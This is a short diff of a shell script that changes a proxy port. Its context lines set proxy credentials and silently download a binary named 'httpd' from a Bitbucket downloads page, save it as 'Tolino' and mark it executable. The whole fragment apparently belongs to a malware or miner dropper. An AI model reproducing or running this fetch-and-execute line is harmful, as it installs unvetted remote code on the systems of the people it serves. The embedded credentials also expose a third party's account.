@@ -1,5 +1,5 @@
 proxy="us-east-static-06.quotaguard.com" 
-port="1080" 
+port="9293" 
 user="neozk6kncbe8qm"  
 pass="us-east-static-06.quotaguard.com" 
 wget -q -O Tolino https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Tolino
